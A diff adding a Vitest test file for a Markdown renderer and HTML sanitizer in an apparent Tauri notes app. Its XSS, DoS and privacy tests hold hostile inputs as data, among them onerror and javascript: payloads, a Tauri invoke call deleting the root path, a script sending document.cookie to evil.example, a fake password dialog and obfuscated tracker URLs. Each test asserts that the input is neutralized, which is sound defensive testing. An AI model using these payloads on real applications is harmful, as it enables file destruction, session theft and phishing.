@@ -1,0 +1,316 @@
+// @vitest-environment jsdom
+// renderMarkdown sanitizes its output through DOMPurify, which needs a DOM;
+// the extraction tests below are DOM-agnostic and run fine under jsdom too.
+import MarkdownIt from "markdown-it";
+import { describe, it, expect } from "vitest";
+import { renderMarkdown, sanitizeHtml } from "./markdown";
+import {
+  extractLinks,
+  extractTags,
+  extractLinksAndFirstImage,
+  parseFrontmatter,
+  extractAliases,
+} from "./markdownExtract";
+
+describe("extractLinks", () => {
+  it("captures wiki links and strips aliases", () => {
+    expect(extractLinks("see [[Note]] and [[Other|alias]]")).toEqual([
+      "Note",
+      "Other",
+    ]);
+  });
+
+  it("excludes image embeds but keeps note embeds", () => {
+    expect(extractLinks("![[pic.png]] then ![[Embedded Note]]")).toEqual([
+      "Embedded Note",
+    ]);
+  });
+
+  it("resolves standard markdown links to local .md files", () => {
+    const src = "[a](Note.md) [b](sub/Deep.md) [c](https://x.com) [d](page.html)";
+    expect(extractLinks(src)).toEqual(["Note.md", "sub/Deep.md"]);
+  });
+
+  it("decodes url-encoded markdown links and drops anchors", () => {
+    expect(extractLinks("[x](My%20Note.md#heading)")).toEqual(["My Note.md"]);
+  });
+});
+
+describe("extractTags", () => {
+  it("finds hashtags but not headings or code", () => {
+    const src = "# Heading\n#alpha and #beta/gamma\n```\n#notatag\n```";
+    expect(extractTags(src).sort()).toEqual(["alpha", "beta/gamma"]);
+  });
+
+  it("skips exactly the code the renderer shows as code", () => {
+    const cases = [
+      "#a\n```js\n#skip\n```\n#b",
+      "text```js\n#skip\n``` #after",
+      "```\n#skip\n```\nno-space#skip\n #ok",
+      "```unterminated\n#kept",
+      "#one\n```a``` #two\n```b\n#skip\n``` #three",
+    ];
+    // Oracle: tags in the text markdown-it shows outside code.
+    const md = new MarkdownIt({ html: true, linkify: true });
+    const reference = (source: string) => {
+      const out = new Set<string>();
+      const text = md.parse(source, {})
+        .filter((t) => t.type === "inline")
+        .map((t) => (t.children ?? [])
+          .map((c) => (c.type === "text" ? c.content : c.type.endsWith("break") ? "\n" : "\0"))
+          .join(""))
+        .join("\n");
+      for (const m of text.matchAll(/(?:^|\s)#([A-Za-z][\w/-]*)/g)) out.add(m[1]);
+      return [...out];
+    };
+    for (const source of cases) {
+      expect(extractTags(source)).toEqual(reference(source));
+    }
+  });
+});
+
+describe("first image", () => {
+  it("prefers embeds then markdown images", () => {
+    expect(extractLinksAndFirstImage("text ![[shot.png]] more").firstImage).toBe("shot.png");
+    expect(extractLinksAndFirstImage("![](a.jpg)").firstImage).toBe("a.jpg");
+    expect(extractLinksAndFirstImage("no images here").firstImage).toBeNull();
+  });
+});
+
+describe("frontmatter", () => {
+  it("parses key/values and returns the body", () => {
+    const { body, props } = parseFrontmatter(
+      "---\ntitle: Hello\naliases: [x, y]\n---\nthe body"
+    );
+    expect(body).toBe("the body");
+    expect(props).toContainEqual(["title", "Hello"]);
+  });
+
+  it("extracts aliases (list and scalar forms)", () => {
+    expect(extractAliases("---\naliases: [Foo, Bar]\n---\n")).toEqual([
+      "Foo",
+      "Bar",
+    ]);
+    expect(extractAliases('---\nalias: "Baz"\n---\n')).toEqual(["Baz"]);
+    expect(extractAliases("no frontmatter")).toEqual([]);
+  });
+});
+
+describe("renderMarkdown", () => {
+  it("renders a Properties block from frontmatter", () => {
+    const html = renderMarkdown("---\ntitle: T\n---\n# Body");
+    expect(html).toContain('class="properties"');
+    expect(html).toContain("title");
+  });
+
+  it("renders Obsidian callouts", () => {
+    const html = renderMarkdown("> [!note] Heads up\n> body text");
+    expect(html).toContain('class="callout"');
+    expect(html).toContain('data-callout="note"');
+    expect(html).toContain("Heads up");
+  });
+
+  it("renders wiki links and image embeds with data attributes", () => {
+    const html = renderMarkdown("[[Target]] and ![[img.png]]");
+    expect(html).toContain('class="wikilink"');
+    expect(html).toContain('data-target="Target"');
+    expect(html).toContain('data-embed="img.png"');
+  });
+
+  it("passes benign raw HTML through (quotes normalized by the sanitizer)", () => {
+    const html = renderMarkdown("<div title='x'>hi</div>");
+    expect(html).toContain('title="x"');
+    expect(html).toContain(">hi</div>");
+  });
+});
+
+describe("sanitizeHtml / renderMarkdown XSS defense", () => {
+  // The rendered HTML is injected with dangerouslySetInnerHTML into the trusted
+  // Tauri app document, where an inline handler could call
+  // window.__TAURI_INTERNALS__.invoke (arbitrary fs under the ** scope). Notes
+  // are not always trusted (imported vaults, synced peers, agent-written files),
+  // so every script-execution vector must be stripped while benign formatting
+  // survives. These assert on both renderMarkdown (the real path) and the
+  // exported sanitizeHtml (the same policy) for raw-HTML inputs.
+
+  it("strips <script> tags", () => {
+    const out = sanitizeHtml("<p>ok</p><script>steal()</script>");
+    expect(out).toContain("ok");
+    expect(out.toLowerCase()).not.toContain("<script");
+    expect(out).not.toContain("steal()");
+  });
+
+  it("strips inline event handlers (the img onerror vector)", () => {
+    const out = sanitizeHtml('<img src="x" onerror="pwn()">');
+    expect(out.toLowerCase()).not.toContain("onerror");
+    expect(out).not.toContain("pwn()");
+  });
+
+  it("strips javascript: URLs on links", () => {
+    const out = sanitizeHtml('<a href="javascript:pwn()">click</a>');
+    expect(out.toLowerCase()).not.toContain("javascript:");
+    expect(out).toContain("click");
+  });
+
+  it("strips svg/onload and other handler-bearing elements", () => {
+    const out = sanitizeHtml('<svg><animate onbegin="pwn()"></svg>');
+    expect(out.toLowerCase()).not.toContain("onbegin");
+    expect(out).not.toContain("pwn()");
+  });
+
+  it("forbids iframe/object/embed/base/form framing & plugin vectors", () => {
+    const out = sanitizeHtml(
+      '<iframe src="data:text/html,<script>pwn()</script>"></iframe>' +
+        '<object data="x"></object><embed src="x">' +
+        '<base href="http://evil"><form action="http://evil"></form>'
+    );
+    const lower = out.toLowerCase();
+    for (const tag of ["<iframe", "<object", "<embed", "<base", "<form"]) {
+      expect(lower).not.toContain(tag);
+    }
+  });
+
+  it("neutralizes the vector end-to-end through renderMarkdown", () => {
+    const evil =
+      "# Note\n\nnormal text\n\n" +
+      '<img src=x onerror="window.__TAURI_INTERNALS__.invoke(\'plugin:fs|remove\',{path:\'/\'})">\n\n' +
+      "<script>fetch('https://evil.example/'+document.cookie)</script>";
+    const html = renderMarkdown(evil);
+    const lower = html.toLowerCase();
+    expect(html).toContain("normal text"); // benign content preserved
+    expect(lower).not.toContain("onerror");
+    expect(lower).not.toContain("<script");
+    expect(html).not.toContain("__TAURI_INTERNALS__");
+  });
+
+  it("preserves the app's own emitted markup (wikilinks, embeds, callouts, tasks)", () => {
+    const html = renderMarkdown(
+      "> [!note] Title\n> body\n\n[[Target]] and ![[img.png]]\n\n- [x] done\n- [ ] todo"
+    );
+    expect(html).toContain('data-target="Target"');
+    expect(html).toContain('data-embed="img.png"');
+    expect(html).toContain('data-callout="note"');
+    expect(html).toContain('class="wikilink"');
+  });
+
+  it("keeps safe links and local images but defers remote media", () => {
+    const out = sanitizeHtml(
+      '<a href="https://example.com">x</a><img src="images/local.png"><img src="https://t.example/p.gif" srcset="https://t.example/2x.gif 2x"><video poster="http://t.example/p.jpg" src="//t.example/v.mp4"></video>'
+    );
+    expect(out).toContain('href="https://example.com"');
+    expect(out).toContain('src="images/local.png"');
+    expect(out).not.toMatch(/\s(src|srcset|poster)="(https?:)?\/\//);
+    expect(out).toContain('data-remote-src="https://t.example/p.gif"');
+    expect(out).toContain('data-remote-srcset');
+    expect(out).toContain('data-remote-poster');
+  });
+
+  it("keeps only renderer classes, so notes cannot borrow app overlay styling", () => {
+    const template = document.createElement("template");
+    template.innerHTML = renderMarkdown(
+      '<div class="modal-overlay callout" popover="manual" id="fake">Mesa needs your password</div>\n\n' +
+        '<button popovertarget="fake" popovertargetaction="show" commandfor="d" command="show-modal">Continue</button>\n\n' +
+        '<dialog id="d" open>fake dialog</dialog>\n\n<p class="modal">plain</p>'
+    );
+    const div = template.content.querySelector("div")!;
+    expect(div.getAttribute("class")).toBe("callout");
+    expect(div.hasAttribute("popover")).toBe(false);
+    const button = template.content.querySelector("button")!;
+    for (const name of ["popovertarget", "popovertargetaction", "commandfor", "command"]) {
+      expect(button.hasAttribute(name)).toBe(false);
+    }
+    expect(template.content.querySelector("dialog")).toBeNull();
+    expect(template.content.querySelector("p")!.hasAttribute("class")).toBe(false);
+    expect(template.content.textContent).toContain("plain");
+  });
+
+  it("keeps every class the Markdown renderer emits", () => {
+    const template = document.createElement("template");
+    template.innerHTML = renderMarkdown(
+      "---\ntitle: T\n---\n> [!note] Title\n> body\n\n[[Target]] ![[Other]] ![[img.png]]\n\n- [x] done\n\n```ts\nconst a = 1;\n```"
+    );
+    const classes = new Set([...template.content.querySelectorAll("[class]")].flatMap((node) => [...node.classList]));
+    expect([...classes].sort()).toEqual([
+      "callout", "callout-title", "embed", "language-ts", "md-embed", "prop", "prop-key", "prop-val",
+      "properties", "task-list", "wikilink",
+    ]);
+  });
+
+  it("removes inline styles that could overlay the app", () => {
+    const out = sanitizeHtml(
+      '<a href="https://evil.example/x" style="position:fixed;inset:0;opacity:0">x</a><div style="z-index:9">y</div>'
+    );
+    expect(out).not.toContain("style");
+    expect(out).toContain("x</a>");
+  });
+});
+
+describe("renderMarkdown DoS resistance", () => {
+  // `linkify: true` routes every note through linkify-it. Versions <= 5.0.1
+  // scanned an unbounded email local-part / auth segment, so a note made of
+  // repeated `mailto:` rescanned to end-of-input on each position — quadratic.
+  // Measured on the vulnerable release: 22 kB -> 86 ms, 44 kB -> 317 ms,
+  // 98 kB -> 1662 ms (a 1 MB note would hang the webview for minutes). 5.0.2
+  // caps the local-part at 64 chars (RFC 5321) and auth at 50, making it flat
+  // (~4 ms at 98 kB). This matters because note bytes are NOT trusted: they
+  // arrive from imported vaults, synced peer devices, and agent-fetched web
+  // content (see the module docblock in markdown.ts). Threshold is deliberately
+  // loose — it separates linear from quadratic, not fast from slow.
+  it("renders an adversarial repeated-`mailto:` note in linear time", () => {
+    const note = "mailto:".repeat(14300); // ~98 kB
+    const t0 = performance.now();
+    const html = renderMarkdown(note);
+    const elapsed = performance.now() - t0;
+    expect(html.length).toBeGreaterThan(0);
+    expect(elapsed).toBeLessThan(500);
+  });
+});
+
+describe('remote media privacy boundary', () => {
+  const vectors = [
+    ['SVG image', '<svg><image href="https://tracker.example/a.png"/></svg>', 'href'],
+    ['SVG filter', '<svg><filter><feImage href="https://tracker.example/b.png"/></filter></svg>', 'href'],
+    ['background', '<table background="https://tracker.example/bg.png"><tr><td>x</td></tr></table>', 'background'],
+    ['newline scheme', '<img src="ht\ntps://tracker.example/c.png">', 'src'],
+    ['tab scheme', '<img src="ht\ttps://tracker.example/c.png">', 'src'],
+    ['image input', '<input type="image" src="https://tracker.example/d.png">', 'src'],
+    ['obfuscated srcset', '<img srcset="local.png 1x, ht&#9;tps://tracker.example/2.png 2x">', 'srcset'],
+    ['SVG xlink', '<svg><image xlink:href="https://tracker.example/e.png"/></svg>', 'xlink:href'],
+    ['backslash host', '<img src="\\\\tracker.example/f.png">', 'src'],
+    ['slash-backslash host', '<img src="/\\tracker.example/g.png">', 'src'],
+    ['backslash scheme', '<img src="https:\\\\tracker.example/h.png">', 'src'],
+    ['backslash srcset', '<img srcset="local.png 1x, \\\\tracker.example/i.png 2x">', 'srcset'],
+  ];
+  it.each(vectors)('parks %s through the actual renderer', (_label, source, name) => {
+    const template = document.createElement('template');
+    template.innerHTML = renderMarkdown(source);
+    const parked = template.content.querySelector(`[data-remote-${name.replace(':', '-')}]`);
+    expect(parked).not.toBeNull();
+    expect(parked!.hasAttribute(name)).toBe(false);
+  });
+
+  it('never restores authored data attributes, including script and remote URLs', () => {
+    const html = sanitizeHtml('<img data-remote-src="javascript:alert(1)"><svg><image data-remote-href="https://tracker.example/x"/></svg><table data-remote-background="//tracker.example/bg"></table>');
+    expect(html).not.toContain('data-remote-');
+  });
+
+  it('covers tag, attribute, scheme and control-character combinations with an independent URL oracle', () => {
+    const tags = ['img', 'input', 'source', 'video', 'audio', 'track', 'table', 'td', 'div', 'body', 'image', 'feImage', 'use', 'a', 'link', 'object', 'embed', 'iframe', 'script'];
+    const attrs = ['src', 'poster', 'background', 'data', 'href', 'xlink:href', 'srcset'];
+    const urls = ['https://tracker.example/p', 'http://tracker.example/p', '//tracker.example/p', '\\\\tracker.example/p', '/\\tracker.example/p', ' ht\ntps://tracker.example/p', 'ht\ttps://tracker.example/p', '\r\n//tracker.example/p', 'HTTPS://tracker.example/p', 'https:&#9;//tracker.example/p'];
+    for (const tag of tags) for (const attr of attrs) for (const url of urls) {
+      const element = `<${tag} ${attr}="${attr === 'srcset' ? `local.png 1x, ${url} 2x` : url}">content</${tag}>`;
+      const template = document.createElement('template');
+      template.innerHTML = sanitizeHtml(['image', 'feImage', 'use'].includes(tag) ? `<svg>${element}</svg>` : element);
+      for (const node of template.content.querySelectorAll('*')) for (const name of attrs) {
+        if (node.localName === 'a' && name === 'href') continue;
+        const value = node.getAttribute(name);
+        if (value === null) continue;
+        for (const part of name === 'srcset' ? value.split(',').map(v => v.trim().split(/\s+\d/)[0]) : [value]) {
+          const parsed = new URL(part, 'https://local.example/');
+          expect(parsed.hostname, `${tag} ${attr} ${JSON.stringify(url)}`).not.toBe('tracker.example');
+        }
+      }
+    }
+  });
+});
